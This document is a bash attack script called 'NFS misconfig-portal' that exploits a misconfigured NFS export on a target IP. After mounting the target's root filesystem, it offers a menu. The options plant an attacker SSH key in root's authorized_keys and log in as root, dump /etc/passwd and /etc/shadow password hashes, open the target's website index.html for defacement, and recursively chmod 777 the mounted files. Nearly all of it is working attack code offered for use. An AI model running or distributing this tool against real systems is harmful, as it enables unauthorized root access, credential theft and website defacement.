#!/bin/bash

#----------------------------------------------------------------------
#Functions
showDirandPass(){
	cd etc
    echo -e "-------------------------------------------------------\n"
    echo -e "..................PASSWORD DIRECTORIES:.................\n"
    echo -e "---------------------------------------------------------\n"
    cat passwd
    
    echo -e "-------------------------------------------------------\n"
    echo -e "..................HASHED USER PASSWORDS::...............\n"
    echo -e "---------------------------------------------------------\n"
    cat /etc/shadow
	}
	
SSHkeyChainPoison(){
showmount -e $ipAdd
mkdir /root/$folderDirName
cd /root/$folderDirName
ssh-keygen 
df -k
pwd
cd /mnt/root/.ssh/
ls
echo -n "${nl}Specify the filename of the newly created private SSH key: " 
read privKey #read the ssh private key
echo -n "${nl}Specify the filename of the newly created public SSH key: " 
read PubKey #read the ssh public key

cp /root/$folderDirName/$PubKey /mnt/root/.ssh/
ls
cat $PubKey >> authorized_keys 
cd /root/$folderDirName
ssh -i $privKey root@$ipAdd


}

WebsiteSeizer(){
	cd /var/www/html #now inside the html folder
	#----------Text Editor choices---------#
	echo -n "1.gedit${nl}"
	echo -n "2.vim${nl}"
	echo -n "3.pluma${nl}"
	echo -n "4.geany${nl}"
	echo -n "5.nano${nl}"
	echo -n "${nl}Choose a text editor for editing the website: "
	echo -n "${nl}> "   
	read Tchoice
	#open website using user's text editor's choice
	case $Tchoice in
    1)
		gedit showmount /var/www/html/index.html
    ;;
    2)
		vi /var/www/html/index.html
    ;;
    3)
		pluma /var/www/html/index.html
    ;;
    4)
		geany /var/www/html/index.html
    ;;
    5)
		nano /var/www/html/index.html
    ;;
	
	

esac
}	

MASSpriv(){
	echo -e "\n------------------------------------------------------------------------------------\n"
	echo -e "..................Making everything readable, writable and executable.................\n"
	echo -e "-------------------------------------------------------------------------------------\n"
	pwd 
	echo $folderDirName
	#make everything in there editable, writable and executable
	echo -n "${nl}Working...This should take a 40 seconds or so: "
	chmod -R 777 .
	echo -n "${nl}Done...: "
	
	}
	
everything(){
	echo -e "-------------------------------------------------------\n"
	echo -e "..................DOING EVERYTHING!!!:.................\n"
	echo -e "---------------------------------------------------------\n"
	MASSpriv
	showDirandPass
	SSHkeyChainPoison
	WebsiteSeizer
	}
	
	#new line variable
	nl=$'\n'	
#END of function section----------------------------------------------------------------
#Main Part of the program----------------------------------------------------------
printf "============================================================================\n"
printf "NFS misconfig-portal\n"
printf "By DrXploiter\n"
printf "===========================================================================\n"

#specify target ip
echo -n 'Specify IP target of NFS misconfig?: '
read ipAdd

echo -e 'Attempting to Display NFS remote accesible shares....\n'
#list the remote accesible NFS shares directories
showmount -e $ipAdd 

echo -e "\nContinue? [ENTER] Exit [n] "
read continue
if [ "$continue" = "n" ]; then
echo "Exiting...";
exit
else
   echo "${nl}Starting...";
fi 

#------------Mounting block procedures-----------------#
#create folder for mounting
echo -n "Create folder name: "
read folderDirName
#create folder for mounting
mkdir /root/$folderDirName
cd /root/$folderDirName
cd /
mount -t nfs $ipAdd:/ /mnt
echo "${nl}We are in have fun!.........."
ls
#------------Done-----------------#



#-----------------------------------------------------------------------------------------
#give additional options or close for you to do things manually
pwd
echo -n "${nl}Now what should we do?: "
echo -n "${nl}1.Create and import a public SSH key into the victim's SSH keychain"
echo -n "${nl}2.Display all user DIRs and hashed passwords"
echo -n "${nl}3.Seize the local website [/var/www/html] for making changes to"  
echo -n "${nl}4.Do Everything!"  
echo -n "${nl}5.make all remote folders/files readable/writable/executable" 
echo -n "${nl}6.Do nothing... Let me handle this now!${nl}" 
echo -n "${nl}> "   


#Main menu choices----------------------------------------------------------------------
read choice
case $choice in
    1)
    SSHkeyChainPoison #ssh key chain importer
    exec bash #stay in current folder after exiting
    ;;
    
    2)
    showDirandPass #show the directories of users and the hashed passwords
    exec bash #stay in current folder after exiting
    ;;
    
    3)
    WebsiteSeizer #locate index folder and begin site modification
    ;;
    
    4)
    everything #just do everything from above
    exec bash #stay in current folder after exiting
    ;;
 
    5)
	MASSpriv #make all folders readable/writable/executable for easy pentesting
    ;;
    
    6)
    echo "{nl}Exiting....{nl}"
    echo "{nl}Have fun....{nl}"
    exec bash
    ;;
esac
#END------------------------------------------------------------
